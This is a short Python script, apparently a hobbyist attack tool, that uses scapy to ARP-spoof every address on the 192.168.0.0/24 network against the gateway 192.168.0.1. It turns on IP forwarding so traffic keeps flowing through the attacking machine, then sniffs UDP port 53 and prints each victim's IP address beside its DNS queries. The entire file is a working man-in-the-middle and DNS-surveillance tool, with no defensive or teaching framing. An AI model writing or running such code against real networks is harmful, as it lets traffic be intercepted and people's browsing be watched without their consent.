import logging
from scapy.all import ARP, Net, send, sniff, getmacbyip
from scapy.layers.dns import DNS, DNSQR, IP
import threading
import time
from hinkiche import Hinkiche
import sys
import subprocess

hinkiche = Hinkiche()
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def arp_spoof(ip, spoof_ip):
    target_mac = getmacbyip(ip)
    if target_mac:
        pack = ARP(op=2, pdst=ip, hwdst=target_mac, psrc=spoof_ip)
        send(pack, verbose=0)

def DNS_PAC(pakt):
    if pakt.haslayer(DNS) and pakt.getlayer(DNS).qr == 0:
        ip_src = pakt[IP].src
        dns_query = pakt[DNSQR].qname.decode()
        print(ip_src, dns_query)

def enable_forwarding():
    if sys.platform == "linux":
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start(target_list, getway):
    enable_forwarding()
    while True:
        for target_ip in target_list:
            if target_ip != getway:
                arp_spoof(target_ip, getway)
                arp_spoof(getway, target_ip)
        time.sleep(2)
    
getway = "192.168.0.1"
hinkiche.print_logo()

target_ips = [str(ip) for ip in Net("192.168.0.0/24")]
threading.Thread(target=start, args=(target_ips, getway), daemon=True).start()
print("Network")
print("-" * 50)

print(f"{'IP':<20} \t {'DNS Query':<20}")
print("-" * 50)
sniff(filter="udp port 53", prn=DNS_PAC, store=0)
print("-" * 50)